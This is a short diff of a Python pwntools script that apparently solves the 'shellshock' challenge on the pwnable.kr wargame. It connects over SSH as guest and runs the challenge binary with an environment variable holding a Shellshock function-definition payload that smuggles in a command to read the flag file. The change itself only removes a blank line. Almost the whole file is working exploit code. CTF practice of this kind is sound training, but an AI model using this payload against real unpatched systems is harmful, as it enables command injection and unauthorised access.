@@ -1,6 +1,5 @@
 from pwn import *
 
-
 con = ssh("shellshock", "pwnable.kr", 2222, "guest")
 env = {"var": "() { :;}; ./bash -c 'cat flag'"}
 sh = con.process(executable="/home/shellshock/shellshock", env=env)
